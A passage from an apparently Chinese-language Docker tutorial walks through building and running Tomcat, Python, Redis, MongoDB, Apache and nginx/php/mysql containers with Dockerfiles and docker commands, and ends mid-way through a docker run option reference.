\# sh removes env vars it doesn&apos;t support (ones with periods)# https://github.com/docker-library/tomcat/issues/77 find ./bin/ -name &apos;*.sh&apos; -exec sed -ri &apos;s|^#!/bin/sh$|#!/usr/bin/env bash|&apos; &apos;&#123;&#125;&apos; +# verify Tomcat Native is working properlyRUN set -e \ &amp;&amp; nativeLines=&quot;$(catalina.sh configtest 2&gt;&amp;1)&quot; \ &amp;&amp; nativeLines=&quot;$(echo &quot;$nativeLines&quot; | grep &apos;Apache Tomcat Native&apos;)&quot; \ &amp;&amp; nativeLines=&quot;$(echo &quot;$nativeLines&quot; | sort -u)&quot; \ &amp;&amp; if ! echo &quot;$nativeLines&quot; | grep &apos;INFO: Loaded APR based Apache Tomcat Native library&apos; &gt;&amp;2; then \ echo &gt;&amp;2 &quot;$nativeLines&quot;; \ exit 1; \ fiEXPOSE 8080CMD [&quot;catalina.sh&quot;, &quot;run&quot;]通过Dockerfile创建一个镜像，替换成你自己的名字1[root@localhost ~]# docker build -t tomcat .创建完成后，我们可以在本地的镜像列表里查找到刚刚创建的镜像12[root@localhost ~]# docker images|grep tomcattomcat latest 70f819d3d2d9 7 days ago 335.8 MB使用tomcat镜像运行容器12[root@localhost home]# docker run --name test_docker_tomcat -p 8080:8080 -v $PWD/test:/usr/local/tomcat/webapps/test -d tomcat3bdf4b155aaef20bac44511f84b402a2cb6d6957bc284c21a51e89fcbc2081a6命令说明：-p 8080:8080：将容器的8080端口映射到主机的8080端口-v $PWD/test:/usr/local/tomcat/webapps/test：将主机中当前目录下的test挂载到容器的/test查看容器启动情况123[root@localhost home]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES3bdf4b155aae tomcat "catalina.sh run" 21 seconds ago Up 20 seconds 0.0.0.0:8080-&gt;8080/tcp test_docker_tomcat通过浏览器访问浏览器地址看输入：http://ip:8080Docker 安装 Python安装步骤方法一、docker pull python:3.5查找Docker Hub上的python镜像123456[root@localhost ~]# docker search pythonNAME DESCRIPTION STARS OFFICIAL AUTOMATEDpython Python is an interpreted,... 982 [OK] kaggle/python Docker image for Python... 33 [OK]azukiapp/python Docker image to run Python ... 3 [OK]vimagick/python mini python 2 [OK]这里我们拉取官方的镜像,标签为3.51[root@localhost ~]# docker pull python:3.5等待下载完成后，我们就可以在本地镜像列表里查到REPOSITORY为python,标签为3.5的镜像。123[root@localhost ~]# docker images python:3.5 REPOSITORY TAG IMAGE ID CREATED SIZEpython 3.5 045767ddf24a 9 days ago 684.1 MB方法二、通过 Dockerfile 构建首先，创建目录python,用于存放后面的相关东西。1[root@localhost ~]# mkdir -p ~/python ~/python/myappmyapp目录将映射为python容器配置的应用目录进入创建的python目录，创建Dockerfile，这个是以Ubuntu系统为参考，CentOS系统使用的话需要修改123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051FROM buildpack-deps:jessie# remove several traces of debian pythonRUN apt-get purge -y python.*# http://bugs.python.org/issue19846# &gt; At the moment, setting &quot;LANG=C&quot; on a Linux system *fundamentally breaks Python 3*, and that&apos;s not OK.ENV LANG C.UTF-8# gpg: key F73C700D: public key &quot;Larry Hastings &lt;larry@hastings.org&gt;&quot; importedENV GPG_KEY 97FC712E4C024BBEA48A61ED3A5CA953F73C700DENV PYTHON_VERSION 3.5.1# if this is called &quot;PIP_VERSION&quot;, pip explodes with &quot;ValueError: invalid truth value &apos;&lt;VERSION&gt;&apos;&quot;ENV PYTHON_PIP_VERSION 8.1.2RUN set -ex \ &amp;&amp; curl -fSL &quot;https://www.python.org/ftp/python/$&#123;PYTHON_VERSION%%[a-z]*&#125;/Python-$PYTHON_VERSION.tar.xz&quot; -o python.tar.xz \ &amp;&amp; curl -fSL &quot;https://www.python.org/ftp/python/$&#123;PYTHON_VERSION%%[a-z]*&#125;/Python-$PYTHON_VERSION.tar.xz.asc&quot; -o python.tar.xz.asc \ &amp;&amp; export GNUPGHOME=&quot;$(mktemp -d)&quot; \ &amp;&amp; gpg --keyserver ha.pool.sks-keyservers.net --recv-keys &quot;$GPG_KEY&quot; \ &amp;&amp; gpg --batch --verify python.tar.xz.asc python.tar.xz \ &amp;&amp; rm -r &quot;$GNUPGHOME&quot; python.tar.xz.asc \ &amp;&amp; mkdir -p /usr/src/python \ &amp;&amp; tar -xJC /usr/src/python --strip-components=1 -f python.tar.xz \ &amp;&amp; rm python.tar.xz \ \ &amp;&amp; cd /usr/src/python \ &amp;&amp; ./configure --enable-shared --enable-unicode=ucs4 \ &amp;&amp; make -j$(nproc) \ &amp;&amp; make install \ &amp;&amp; ldconfig \ &amp;&amp; pip3 install --no-cache-dir --upgrade --ignore-installed pip==$PYTHON_PIP_VERSION \ &amp;&amp; find /usr/local -depth \ \( \ \( -type d -a -name test -o -name tests \) \ -o \ \( -type f -a -name &apos;*.pyc&apos; -o -name &apos;*.pyo&apos; \) \ \) -exec rm -rf &apos;&#123;&#125;&apos; + \ &amp;&amp; rm -rf /usr/src/python ~/.cache# make some useful symlinks that are expected to existRUN cd /usr/local/bin \ &amp;&amp; ln -s easy_install-3.5 easy_install \ &amp;&amp; ln -s idle3 idle \ &amp;&amp; ln -s pydoc3 pydoc \ &amp;&amp; ln -s python3 python \ &amp;&amp; ln -s python3-config python-configCMD [&quot;python3&quot;]通过Dockerfile创建一个镜像，替换成你自己的名字1[root@localhost ~]# docker build -t python:3.5 .创建完成后，我们可以在本地的镜像列表里查找到刚刚创建的镜像123[root@localhost ~]# docker images python:3.5 REPOSITORY TAG IMAGE ID CREATED SIZEpython 3.5 045767ddf24a 9 days ago 684.1 MB使用python镜像在/home/python/myapp目录下创建一个 helloworld.py 文件，代码如下：12#!/usr/bin/pythonprint("Hello, World!");运行容器1[root@localhost ~]# docker run -v /home/python/myapp:/usr/src/myapp -w /usr/src/myapp python:3.5 python helloworld.py命令说明：-v /home/python/myapp:/usr/src/myapp :将主机指定目录下的myapp挂载到容器的/usr/src/myapp-w /usr/src/myapp :指定容器的/usr/src/myapp目录为工作目录python helloworld.py :使用容器的python命令来执行工作目录中的helloworld.py文件输出结果：1Hello, World!Docker 安装 Redis安装步骤方法一、docker pull redis:5.0查找Docker Hub上的redis镜像12345678[root@localhost ~]# docker search redisNAME DESCRIPTION STARS OFFICIAL AUTOMATEDredis Redis is an open source ... 2321 [OK] sameersbn/redis 32 [OK]torusware/speedus-redis Always updated official ... 29 [OK]bitnami/redis Bitnami Redis Docker Image 22 [OK]anapsix/redis 11MB Redis server image ... 6 [OK]...这里我们拉取官方的镜像,标签为5.01[root@localhost ~]# docker pull redis:5.0等待下载完成后，我们就可以在本地镜像列表里查到REPOSITORY为redis,标签为5.0的镜像。123[root@localhost ~]# docker images redisREPOSITORY TAG IMAGE ID CREATED SIZEredis 5.0 598a6f110d01 3 days ago 118MB方法二、通过 Dockerfile 构建首先，创建目录redis,用于存放后面的相关东西。1[root@localhost ~]# mkdir -p ~/redis ~/redis/datadata目录将映射为redis容器配置的/data目录,作为redis数据持久化的存储目录进入创建的redis目录，创建Dockerfile，这个是以Ubuntu系统为参考，CentOS系统使用的话需要修改1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950FROM debian:jessie# add our user and group first to make sure their IDs get assigned consistently, regardless of whatever dependencies get addedRUN groupadd -r redis &amp;&amp; useradd -r -g redis redisRUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \ ca-certificates \ wget \ &amp;&amp; rm -rf /var/lib/apt/lists/*# grab gosu for easy step-down from rootENV GOSU_VERSION 1.7RUN set -x \ &amp;&amp; wget -O /usr/local/bin/gosu &quot;https://github.com/tianon/gosu/releases/download/$GOSU_VERSION/gosu-$(dpkg --print-architecture)&quot; \ &amp;&amp; wget -O /usr/local/bin/gosu.asc &quot;https://github.com/tianon/gosu/releases/download/$GOSU_VERSION/gosu-$(dpkg --print-architecture).asc&quot; \ &amp;&amp; export GNUPGHOME=&quot;$(mktemp -d)&quot; \ &amp;&amp; gpg --keyserver ha.pool.sks-keyservers.net --recv-keys B42F6819007F00F88E364FD4036A9C25BF357DD4 \ &amp;&amp; gpg --batch --verify /usr/local/bin/gosu.asc /usr/local/bin/gosu \ &amp;&amp; rm -r &quot;$GNUPGHOME&quot; /usr/local/bin/gosu.asc \ &amp;&amp; chmod +x /usr/local/bin/gosu \ &amp;&amp; gosu nobody trueENV REDIS_VERSION 5.0.0ENV REDIS_DOWNLOAD_URL http://download.redis.io/releases/redis-5.0.0.tar.gzENV REDIS_DOWNLOAD_SHA1 0c1820931094369c8cc19fc1be62f598bc5961ca# for redis-sentinel see: http://redis.io/topics/sentinelRUN buildDeps=&apos;gcc libc6-dev make&apos; \ &amp;&amp; set -x \ &amp;&amp; apt-get update &amp;&amp; apt-get install -y $buildDeps --no-install-recommends \ &amp;&amp; rm -rf /var/lib/apt/lists/* \ &amp;&amp; wget -O redis.tar.gz &quot;$REDIS_DOWNLOAD_URL&quot; \ &amp;&amp; echo &quot;$REDIS_DOWNLOAD_SHA1 *redis.tar.gz&quot; | sha1sum -c - \ &amp;&amp; mkdir -p /usr/src/redis \ &amp;&amp; tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 \ &amp;&amp; rm redis.tar.gz \ &amp;&amp; make -C /usr/src/redis \ &amp;&amp; make -C /usr/src/redis install \ &amp;&amp; rm -r /usr/src/redis \ &amp;&amp; apt-get purge -y --auto-remove $buildDepsRUN mkdir /data &amp;&amp; chown redis:redis /dataVOLUME /dataWORKDIR /dataCOPY docker-entrypoint.sh /usr/local/bin/ENTRYPOINT [&quot;docker-entrypoint.sh&quot;]EXPOSE 6379CMD [ &quot;redis-server&quot; ]通过Dockerfile创建一个镜像，替换成你自己的名字1[root@localhost ~]# docker build -t redis:5.0 .创建完成后，我们可以在本地的镜像列表里查找到刚刚创建的镜像123[root@localhost ~]# docker images redis REPOSITORY TAG IMAGE ID CREATED SIZEredis 5.0 43c923d57784 2 weeks ago 193.9 MB使用redis镜像运行容器12[root@localhost home]# docker run -p 6379:6379 -v $PWD/data:/data -d redis:5.0 redis-server --appendonly yes2c4e3bfd9691e9174cebba01ebc55f464321749156eb462fd099da3544a0c67b命令说明：-p 6379:6379 : 将容器的6379端口映射到主机的6379端口-v $PWD/data:/data : 将主机中当前目录下的data挂载到容器的/dataredis-server –appendonly yes : 在容器执行redis-server启动命令，并打开redis持久化配置查看容器启动情况123[root@localhost ~]# docker psCONTAINER ID IMAGE COMMAND ... PORTS NAMES43f7a65ec7f8 redis:3.2 "docker-entrypoint.sh" ... 0.0.0.0:6379-&gt;6379/tcp agitated_cray连接、查看容器使用redis镜像执行redis-cli命令连接到刚启动的容器,主机IP为127.0.0.112345678910111213[root@localhost home]# docker exec -it 2c4e3bfd9691 redis-cli127.0.0.1:6379&gt; info# Serverredis_version:5.0.5redis_git_sha1:00000000redis_git_dirty:0redis_build_id:f5cc35eb8e511133redis_mode:standaloneos:Linux 3.10.0-862.el7.x86_64 x86_64arch_bits:64multiplexing_api:epoll...127.0.0.1:6379&gt; quitDocker 安装 MongoDB安装步骤方法一、docker pull mongo查找Docker Hub上的mongo镜像1234567[root@localhost ~]# docker search mongoNAME DESCRIPTION STARS OFFICIAL AUTOMATEDmongo MongoDB document databases ... 1989 [OK] mongo-express Web-based MongoDB admin int... 22 [OK] mvertes/alpine-mongo light MongoDB container 19 [OK]mongooseim/mongooseim-docker MongooseIM server the lates... 9 [OK]......这里我们拉取官方的镜像,标签为4.11[root@localhost ~]# docker pull mongo:4.1等待下载完成后，我们就可以在本地镜像列表里查到REPOSITORY为mongo,标签为4.1的镜像。123[root@localhost home]# docker images mongoREPOSITORY TAG IMAGE ID CREATED SIZEmongo 4.1 6e89620d0711 11 days ago 360MB方法二、通过 Dockerfile 构建首先，创建目录mongo,用于存放后面的相关东西。1[root@localhost ~]# mkdir -p ~/mongo ~/mongo/dbdb目录将映射为mongo容器配置的/data/db目录,作为mongo数据的存储目录进入创建的mongo目录，创建Dockerfile，这个是以Ubuntu系统为参考，CentOS系统使用的话需要修改1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798FROM debian:jessie-slim# add our user and group first to make sure their IDs get assigned consistently, regardless of whatever dependencies get addedRUN groupadd -r mongodb &amp;&amp; useradd -r -g mongodb mongodbRUN apt-get update \ &amp;&amp; apt-get install -y --no-install-recommends \ ca-certificates \ jq \ numactl \ &amp;&amp; rm -rf /var/lib/apt/lists/*# grab gosu for easy step-down from root (https://github.com/tianon/gosu/releases)ENV GOSU_VERSION 1.10# grab "js-yaml" for parsing mongod's YAML config files (https://github.com/nodeca/js-yaml/releases)ENV JSYAML_VERSION 3.10.0RUN set -ex; \ \ apt-get update; \ apt-get install -y --no-install-recommends \ wget \ ; \ rm -rf /var/lib/apt/lists/*; \ \ dpkgArch="$(dpkg --print-architecture | awk -F- '&#123; print $NF &#125;')"; \ wget -O /usr/local/bin/gosu "https://github.com/tianon/gosu/releases/download/$GOSU_VERSION/gosu-$dpkgArch"; \ wget -O /usr/local/bin/gosu.asc "https://github.com/tianon/gosu/releases/download/$GOSU_VERSION/gosu-$dpkgArch.asc"; \ export GNUPGHOME="$(mktemp -d)"; \ gpg --keyserver ha.pool.sks-keyservers.net --recv-keys B42F6819007F00F88E364FD4036A9C25BF357DD4; \ gpg --batch --verify /usr/local/bin/gosu.asc /usr/local/bin/gosu; \ command -v gpgconf &amp;&amp; gpgconf --kill all || :; \ rm -r "$GNUPGHOME" /usr/local/bin/gosu.asc; \ chmod +x /usr/local/bin/gosu; \ gosu nobody true; \ \ wget -O /js-yaml.js "https://github.com/nodeca/js-yaml/raw/$&#123;JSYAML_VERSION&#125;/dist/js-yaml.js"; \# TODO some sort of download verification here \ apt-get purge -y --auto-remove wgetRUN mkdir /docker-entrypoint-initdb.dENV GPG_KEYS \# pub 4096R/AAB2461C 2014-02-25 [expires: 2016-02-25]# Key fingerprint = DFFA 3DCF 326E 302C 4787 673A 01C4 E7FA AAB2 461C# uid MongoDB 2.6 Release Signing Key &lt;packaging@mongodb.com&gt; DFFA3DCF326E302C4787673A01C4E7FAAAB2461C \# pub 4096R/EA312927 2015-10-09 [expires: 2017-10-08]# Key fingerprint = 42F3 E95A 2C4F 0827 9C49 60AD D68F A50F EA31 2927# uid MongoDB 3.2 Release Signing Key &lt;packaging@mongodb.com&gt; 42F3E95A2C4F08279C4960ADD68FA50FEA312927# https://docs.mongodb.com/manual/tutorial/verify-mongodb-packages/#download-then-import-the-key-fileRUN set -ex; \ export GNUPGHOME="$(mktemp -d)"; \ for key in $GPG_KEYS; do \ gpg --keyserver ha.pool.sks-keyservers.net --recv-keys "$key"; \ done; \ gpg --export $GPG_KEYS &gt; /etc/apt/trusted.gpg.d/mongodb.gpg; \ command -v gpgconf &amp;&amp; gpgconf --kill all || :; \ rm -r "$GNUPGHOME"; \ apt-key list# Allow build-time overrides (eg. to build image with MongoDB Enterprise version)# Options for MONGO_PACKAGE: mongodb-org OR mongodb-enterprise# Options for MONGO_REPO: repo.mongodb.org OR repo.mongodb.com# Example: docker build --build-arg MONGO_PACKAGE=mongodb-enterprise --build-arg MONGO_REPO=repo.mongodb.com .ARG MONGO_PACKAGE=mongodb-orgARG MONGO_REPO=repo.mongodb.orgENV MONGO_PACKAGE=$&#123;MONGO_PACKAGE&#125; MONGO_REPO=$&#123;MONGO_REPO&#125;ENV MONGO_MAJOR 3.2ENV MONGO_VERSION 3.2.20RUN echo "deb http://$MONGO_REPO/apt/debian jessie/$&#123;MONGO_PACKAGE%-unstable&#125;/$MONGO_MAJOR main" | tee "/etc/apt/sources.list.d/$&#123;MONGO_PACKAGE%-unstable&#125;.list"RUN set -x \ &amp;&amp; apt-get update \ &amp;&amp; apt-get install -y \ $&#123;MONGO_PACKAGE&#125;=$MONGO_VERSION \ $&#123;MONGO_PACKAGE&#125;-server=$MONGO_VERSION \ $&#123;MONGO_PACKAGE&#125;-shell=$MONGO_VERSION \ $&#123;MONGO_PACKAGE&#125;-mongos=$MONGO_VERSION \ $&#123;MONGO_PACKAGE&#125;-tools=$MONGO_VERSION \ &amp;&amp; rm -rf /var/lib/apt/lists/* \ &amp;&amp; rm -rf /var/lib/mongodb \ &amp;&amp; mv /etc/mongod.conf /etc/mongod.conf.origRUN mkdir -p /data/db /data/configdb \ &amp;&amp; chown -R mongodb:mongodb /data/db /data/configdbVOLUME /data/db /data/configdbCOPY docker-entrypoint.sh /usr/local/bin/RUN ln -s usr/local/bin/docker-entrypoint.sh /entrypoint.sh # backwards compatENTRYPOINT ["docker-entrypoint.sh"]EXPOSE 27017CMD ["mongod"]通过Dockerfile创建一个镜像，替换成你自己的名字1[root@localhost ~]# docker build -t mongo:3.2 .创建完成后，我们可以在本地的镜像列表里查找到刚刚创建的镜像123[root@localhost ~]# docker images mongo:3.2REPOSITORY TAG IMAGE ID CREATED SIZEmongo 3.2 282fd552add6 9 days ago 336.1 MB使用mongo镜像运行容器12[root@localhost home]# docker run --name test_docker_mongodb -p 27017:27017 -v $PWD/mongodb/configdb:/data/configdb/ -v $PWD/mongodb/db/:/data/db/ -d mongo:4.1 --auth4c13b2cef633d1b67b3fb30f2776064eaf110265a9e93a324b62b0780d14cae8命令说明：-p 27017:27017 : 将容器的27017 端口映射到主机的27017 端口-v $PWD/mongodb/configdb:/data/configdb/ 主机中当前目录下的configdb挂载到容器的/data/configdb，作为mongo数据配置目录-v : $PWD/mongodb/db/:/data/db/ 将主机中当前目录下的db挂载到容器的/data/db，作为mongo数据存储目录查看容器启动情况123[root@localhost home]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4c13b2cef633 mongo:4.1 "docker-entrypoint.s…" 3 minutes ago Up 3 minutes 0.0.0.0:27017-&gt;27017/tcp test_docker_mongodb使用mongo镜像执行mongo 命令连接到刚启动的MongoDB容器1234567891011121314151617181920212223242526272829303132333435363738394041# 以 admin 用户身份进入mongo[root@localhost home]# docker exec -it 4c13b2cef633 mongo adminMongoDB shell version v4.1.13connecting to: mongodb://127.0.0.1:27017/admin?compressors=disabled&amp;gssapiServiceName=mongodbImplicit session: session &#123; "id" : UUID("0f3d246c-845e-47e3-b571-4f8c0f94028a") &#125;MongoDB server version: 4.1.13Welcome to the MongoDB shell.For interactive help, type "help".For more comprehensive documentation, see http://docs.mongodb.org/Questions? Try the support group http://groups.google.com/group/mongodb-user# 创建一个 admin 管理员账号&gt; db.createUser(&#123; user: 'admin', pwd: '123456', roles: [ &#123; role: "userAdminAnyDatabase", db: "admin" &#125; ] &#125;);Successfully added user: &#123; "user" : "admin", "roles" : [ &#123; "role" : "userAdminAnyDatabase", "db" : "admin" &#125; ]&#125;# 退出&gt; exit;[root@localhost home]# docker exec -it 4c13b2cef633 mongo adminMongoDB shell version v4.1.13connecting to: mongodb://127.0.0.1:27017/admin?compressors=disabled&amp;gssapiServiceName=mongodbImplicit session: session &#123; "id" : UUID("1c6c9ebd-458d-42d3-906d-51fb84b38bf1") &#125;MongoDB server version: 4.1.13# 再次登录需要对 admin 进行身份认证&gt; db.auth("admin","123456"); 1# 切换数据库&gt; use app;switched to db app&gt;使用 mongo-express 管理mongodbmongo-express是MongoDB的一个可视化图形管理工具，通过docker来运行一个mongo-express，来管理上面创建的mongodb服务。12345# 需要进行账号验证才能使用docker pull docker.io/mongo-expressdocker run -it --rm -p 8081:8081 --link &lt;mongoDB容器ID&gt;:mongo mongo-express# 通过浏览器访问http://&lt;宿主机IP地址&gt;:8081使用 mongoclient 管理 mongodb12345# 需要进行账号验证才能使用docker pull mongoclient/mongoclientdocker run --name mongoclient -d -p 3000:3000 -e MONGO_URL=mongodb://&lt;宿主机IP地址&gt;:27017/ mongoclient/mongoclient# 通过浏览器访问http://&lt;宿主机IP地址&gt;:3000Docker 安装 Apache安装步骤方法一、docker pull httpd查找Docker Hub上的httpd镜像12345678[root@localhost ~]# # docker search httpdNAME DESCRIPTION STARS OFFICIAL AUTOMATEDhttpd The Apache HTTP Server .. 524 [OK] centos/httpd 7 [OK]rgielen/httpd-image-php5 Docker image for Apache... 1 [OK]microwebapps/httpd-frontend Httpd frontend allowing... 1 [OK]lolhens/httpd Apache httpd 2 Server 1 [OK]...这里我们拉取官方的镜像1[root@localhost ~]# docker pull httpd等待下载完成后，我们就可以在本地镜像列表里查到REPOSITORY为httpd的镜像。123[root@localhost home]# docker images httpdREPOSITORY TAG IMAGE ID CREATED SIZEhttpd latest ee39f68eb241 2 days ago 154MB方法二、通过 Dockerfile构建首先，创建目录apache，用于存放后面的相关东西。1[root@localhost ~]# mkdir -p ~/apache/www ~/apache/logs ~/apache/conf命令说明：www目录将映射为apache容器配置的应用程序目录logs目录将映射为apache容器的日志目录conf目录里的配置文件将映射为apache容器的配置文件进入创建的apache目录，创建Dockerfile，这个是以Ubuntu系统为参考，CentOS系统使用的话需要修改1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374FROM debian:jessie# add our user and group first to make sure their IDs get assigned consistently, regardless of whatever dependencies get added#RUN groupadd -r www-data &amp;&amp; useradd -r --create-home -g www-data www-dataENV HTTPD_PREFIX /usr/local/apache2ENV PATH $PATH:$HTTPD_PREFIX/binRUN mkdir -p &quot;$HTTPD_PREFIX&quot; \ &amp;&amp; chown www-data:www-data &quot;$HTTPD_PREFIX&quot;WORKDIR $HTTPD_PREFIX# install httpd runtime dependencies# https://httpd.apache.org/docs/2.4/install.html#requirementsRUN apt-get update \ &amp;&amp; apt-get install -y --no-install-recommends \ libapr1 \ libaprutil1 \ libaprutil1-ldap \ libapr1-dev \ libaprutil1-dev \ libpcre++0 \ libssl1.0.0 \ &amp;&amp; rm -r /var/lib/apt/lists/*ENV HTTPD_VERSION 2.4.20ENV HTTPD_BZ2_URL https://www.apache.org/dist/httpd/httpd-$HTTPD_VERSION.tar.bz2RUN buildDeps=&apos; \ ca-certificates \ curl \ bzip2 \ gcc \ libpcre++-dev \ libssl-dev \ make \ &apos; \ set -x \ &amp;&amp; apt-get update \ &amp;&amp; apt-get install -y --no-install-recommends $buildDeps \ &amp;&amp; rm -r /var/lib/apt/lists/* \ \ &amp;&amp; curl -fSL &quot;$HTTPD_BZ2_URL&quot; -o httpd.tar.bz2 \ &amp;&amp; curl -fSL &quot;$HTTPD_BZ2_URL.asc&quot; -o httpd.tar.bz2.asc \# see https://httpd.apache.org/download.cgi#verify &amp;&amp; export GNUPGHOME=&quot;$(mktemp -d)&quot; \ &amp;&amp; gpg --keyserver ha.pool.sks-keyservers.net --recv-keys A93D62ECC3C8EA12DB220EC934EA76E6791485A8 \ &amp;&amp; gpg --batch --verify httpd.tar.bz2.asc httpd.tar.bz2 \ &amp;&amp; rm -r &quot;$GNUPGHOME&quot; httpd.tar.bz2.asc \ \ &amp;&amp; mkdir -p src \ &amp;&amp; tar -xvf httpd.tar.bz2 -C src --strip-components=1 \ &amp;&amp; rm httpd.tar.bz2 \ &amp;&amp; cd src \ \ &amp;&amp; ./configure \ --prefix=&quot;$HTTPD_PREFIX&quot; \ --enable-mods-shared=reallyall \ &amp;&amp; make -j&quot;$(nproc)&quot; \ &amp;&amp; make install \ \ &amp;&amp; cd .. \ &amp;&amp; rm -r src \ \ &amp;&amp; sed -ri \ -e &apos;s!^(\s*CustomLog)\s+\S+!\1 /proc/self/fd/1!g&apos; \ -e &apos;s!^(\s*ErrorLog)\s+\S+!\1 /proc/self/fd/2!g&apos; \ &quot;$HTTPD_PREFIX/conf/httpd.conf&quot; \ \ &amp;&amp; apt-get purge -y --auto-remove $buildDepsCOPY httpd-foreground /usr/local/bin/EXPOSE 80CMD [&quot;httpd-foreground&quot;]Dockerfile文件中 COPY httpd-foreground /usr/local/bin/ 是将当前目录下的httpd-foreground拷贝到镜像里，作为httpd服务的启动脚本，所以我们要在本地创建一个脚本文件httpd-foreground1234567#!/bin/bashset -e# Apache gets grumpy about PID files pre-existingrm -f /usr/local/apache2/logs/httpd.pidexec httpd -DFOREGROUND赋予httpd-foreground文件可执行权限1[root@localhost ~]# chmod +x httpd-foreground通过Dockerfile创建一个镜像，替换成你自己的名字1[root@localhost ~]# docker build -t httpd .创建完成后，我们可以在本地的镜像列表里查找到刚刚创建的镜像123[root@localhost ~]# docker images httpdREPOSITORY TAG IMAGE ID CREATED SIZEhttpd latest da1536b4ef14 23 seconds ago 195.1 MB使用apache镜像运行容器12345678# 运行后使用docker ps查看，发现没有启动，也就是说这个命令有问题[root@localhost ~]# docker run -p 80:80 -v $PWD/www/:/usr/local/apache2/htdocs/ -v $PWD/conf/httpd.conf:/usr/local/apache2/conf/httpd.conf -v $PWD/logs/:/usr/local/apache2/logs/ -d httpd## 使用这个命令可以启动[root@localhost ~]# docker run -it -d -p 80:80 --name test_docker_httpd -v /home/apache/:/usr/local/apache2/htdocs/ httpd# 在/home/apache/目录下新建一个index.html文件，使用浏览器访问测试命令说明：-p 80:80 :将容器的80端口映射到主机的80端口-v $PWD/www/:/usr/local/apache2/htdocs/ :将主机中当前目录下的www目录挂载到容器的/usr/local/apache2/htdocs/-v $PWD/conf/httpd.conf:/usr/local/apache2/conf/httpd.conf :将主机中当前目录下的conf/httpd.conf文件挂载到容器的/usr/local/apache2/conf/httpd.conf-v $PWD/logs/:/usr/local/apache2/logs/ :将主机中当前目录下的logs目录挂载到容器的/usr/local/apache2/logs/查看容器启动情况123[root@localhost ~]# docker psCONTAINER ID IMAGE COMMAND ... PORTS NAMES79a97f2aac37 httpd "httpd-foreground" ... 0.0.0.0:80-&gt;80/tcp sharp_swanson通过浏览器访问，出现的内容是index.html的内容但是有个问题，配置文件这个要弄，估计还得从启动httpd的命令处着手，就跟nginx容器启动类似MacOS系统配置Nginx+php+mysql的docker使用环境创建目录1mkdir -p /Users/sui/docker/nginx/conf.d &amp;&amp; mkdir /Users/sui/www &amp;&amp; cd /Users/sui/docker/nginx/conf.d &amp;&amp; sudo touch default.conf启动php-fpm123docker run --name sui-php -d -v /Users/sui/www:/var/www/html:ro php:7.1-fpm# --name sui-php 是容器的名字# /Users/sui/www 是本地 php 文件的存储目录，/var/www/html 是容器内 php 文件的存储目录，ro 表示只读编辑 nginx 配置文件配置文件位置：/Users/sui/docker/nginx/conf.d/default.conf。1234567891011121314151617181920212223server &#123; listen 80; server_name localhost; location / &#123; root /usr/share/nginx/html; index index.html index.htm; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root /usr/share/nginx/html; &#125; location ~ \.php$ &#123; fastcgi_pass php:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /var/www/html/$fastcgi_script_name; include fastcgi_params; &#125;&#125;# php:9000 表示 php-fpm 服务的访问路径# /var/www/html 是 sui-php 中 php 文件的存储路径，经 docker 映射，变成本地路径 /Users/sui/www启动 nginx123456docker run --name sui-nginx -p 80:80 -d -v /Users/sui/www:/usr/share/nginx/html:ro \ -v /Users/sui/docker/nginx/conf.d:/etc/nginx/conf.d:ro --link sui-php:php nginx# -p 80:80 用于添加端口映射，把 sui-nginx 中的 80 端口暴露出来# /Users/sui/www 是本地html文件的存储目录，/usr/share/nginx/html是容器内html文件的存储目录# /Users/sui/docker/nginx/conf.d 是本地nginx虚拟主机配置路径，/etc/nginx/conf.d是nginx容器内虚拟主机配置路径(重要)# --link sui-php:php 把sui-php的网络并入sui-nginx，并通过修改 sui-nginx 的 /etc/hosts，把域名 php 映射成 127.0.0.1，让 nginx 通过 php:9000 访问 php-fpm（这一步至关重要）测试结果在 /Users/sui/www 下放两个文件：index.html index.phpmysql 服务器1234mkdir -p /Users/sui/docker/mysql/data /Users/sui/docker/mysql/logs /Users/sui/docker/mysql/conf# data 目录将映射为 mysql 容器配置的数据文件存放路径# logs 目录将映射为 mysql 容器的日志目录# conf 目录里的配置文件将映射为 mysql 容器的配置文件12# 启动docker里的MySQL镜像docker run -p 3306:3306 --name sui-mysql -v /Users/sui/docker/mysql/conf:/etc/mysql -v /Users/sui/docker/mysql/logs:/logs -v /Users/sui/docker/mysql/data:/mysql_data -e MYSQL_ROOT_PASSWORD=123456 -d --link sui-php mysql进入mysql客户端1docker run -it --link sui-mysql:mysql --rm mysql sh -c 'exec mysql -h"$MYSQL_PORT_3306_TCP_ADDR" -P"$MYSQL_PORT_3306_TCP_PORT" -uroot -p"$MYSQL_ENV_MYSQL_ROOT_PASSWORD"'phpmyadmin1docker run --name sui-myadmin -d --link sui-mysql:db -p 8080:80 phpmyadmin/phpmyadmin要点若某个镜像中需要使用到另一个镜像中的资源，则需要使用-–link进行关联，比如：nginx关联php，php关联mysql等。Docker 命令大全容器生命周期管理run1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465docker run ：创建一个新的容器并运行一个命令语法docker run [OPTIONS] IMAGE [COMMAND] [ARG...]OPTIONS说明： -a stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项； -d: 后台运行容器，并返回容器ID； -i: 以交互模式运行容器，通常与 -t 同时使用； -P: 随机端口映射，容器内部端口随机映射到主机的高端口 -p: 指定端口映射，格式为：主机(宿主)端口:容器端口 -t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用； --name=&quot;nginx-lb&quot;: 为容器指定一个名称； --dns 8.8.8.8: 指定容器使用的DNS服务器，默认和宿主一致； --dns-search example.com: 指定容器DNS搜索域名，默认和宿主一致； -h &quot;mars&quot;: 指定容器的hostname； -e username=&quot;ritchie&quot;: 设置环境变量； --env-file=[]: 从指定文件读入环境变量； --cpuset=&quot;0-2&quot; or --cpuset=&quot;0,1,2&quot;: 绑定容器到指定CPU运行； -m :设置容器使用内存最大值； --net=&quot;bridge&quot;: 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型； --link=[]: 添加链接到另一个容器； --expose=[]: 